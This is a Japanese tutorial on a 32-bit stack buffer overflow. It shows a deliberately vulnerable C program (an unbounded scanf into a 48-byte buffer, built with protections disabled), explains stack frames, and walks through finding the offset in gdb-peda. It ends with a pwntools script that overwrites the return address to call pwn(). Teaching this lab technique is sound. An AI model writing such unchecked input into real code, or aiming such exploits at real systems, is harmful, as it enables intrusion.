# リターンアドレスの書き換え (バッファオーバーフロー 2)
32bit (x86) / Intel記法です.

## 攻撃対象
バッファオーバーフロー(BOF)の脆弱性を持つプログラム
```c
#include <stdio.h>

void pwn() {
    printf("hacked!\n");
}

void vuln() {
    char overflowme[48];
    scanf("%[^\n]", overflowme);
}

int main() {
    vuln();
    printf("failed!\n");
    return 0;
}
```
コンパイルと下準備
```shell
$ gcc -m32 -fno-stack-protector bof01.c
$ sudo sysctl -w kernel.randomize_va_space=0
```
## 概要
`main()` -> `vuln()` で、`overflowme` を　BOF させて、`vuln()` のリターンアドレスを書き換えて `pwn()` へ飛ぶ.

---
## アセンブリにおける関数の呼び出し
```assembly
main:
    push argn
    ...
    push arg2
    push arg1
    call func // ... (1)
    mov retval, eax

func:
    push ebp // ... (2)
    mov ebp, esp /// ... (2)
    ...
    mov esp, ebp // ...(3)
    pop ebp // ... (3)
    ret // ... (4)
```
### (1) 呼び出す関数を `call` する.  
`call func` は、`eip` (次の命令を格納するレジスタ) を `push` して、`eip` を `func` のアドレスにする.

`call func` を分解したもの
```assembly
push eip
mov eip, func
```

### (2) 呼び出した関数用の stack をつくる.
`main` で使っていた `ebp` をスタックに退避させ、 `ebp` を `esp` と同じ値にする.
```
1. 関数呼び出し前

----------- esp 
main() スタック
----------- ebp
```
```
2. (2) を実行したところ

----------- esp, ebp
ebp のバックアップ
-----------
main() スタック
-----------
```
```
3. func() スタックを確保
sub esp 0x4 等を使う

----------- esp
func() スタック
----------- ebp
ebp のバックアップ
-----------
main() スタック
-----------
```
`func()` 用のスタックが確保できた.

### (3) `leave`
基本的に (2) の操作の逆を行う.  

*(3) の部分は　`leave` と省略されることもある.
```
1. mov esp, ebp

-----------
func() スタック
----------- esp, ebp
ebp のバックアップ
-----------
main() スタック
-----------
```
```
2. pop ebp
esp の位置から、pop する. (= ebp に "ebp のバックアップ"を格納する.)

-----------
func() スタック
----------- esp
main() スタック
----------- ebp
```

### (4) `ret`
(1) で `push` した `eip` (次の命令を指すレジスタ) の値を `eip` に `pop` する.
```assebmly
pop eip
```

この結果、次に実行される命令は、return 先の関数になる.

---

## 具体的な方法
`ret` 命令で `eip` に `pop` する値 (A) を書き換えたい.
```
----------- esp
vuln() スタック
----------- ebp
ebp のバックアップ
-----------
push された eip の値  <- (A)
-----------
main() スタック
-----------
```
`vuln()` には BOF の脆弱性がある. これを使って、(A) の値を書き換える.

### オフセットの特定
"push された eip の値" を書き換えるどの程度の長さのオフセットが必要なのかを特定する.

まず、

```bash
gdb-peda $ pattc [文字数 ex. 100]
```
を使う.  
これによって、任意の文字数の**便利**な文字列が生成される. これをコピーする.

次にこの文字列を `scanf` に読ませる
```bash
gdb-peda $ run
[便利な文字列]
```

すると、`ret` 命令の時点で、`pop eip` するスタックが不正な値となるため、実行が停止する.  
このときの `eip` の値を検索する.
```bash
gdb-peda $ patto [eip の値]
```
これで出た値が、"`push` された `eip`の値 (A)" を書き換えるために必要なオフセット.

つまり
```
----------- esp
vuln() スタック
----------- ebp
ebp のバックアップ
-----------
push された eip の値  <- (A)
-----------
main() スタック
-----------
```
`vuln() スタック` の `overflowme` から、 (A) までの距離.

この値は後で使う.

### 呼び出す関数のアドレス取得
書き換えるアドレスを取得.
```
gdb-peda $ p pwn
```

### 攻撃コードの作成
```python
from pwn import *

offset = 60 # オフセットの値
pwn_addr = "\xed\x61\x55\x56" # pwn の開始アドレス.
p = process("./a.out")
p.sendline("A"*offset+pwn_addr)
print(p.recvline())
```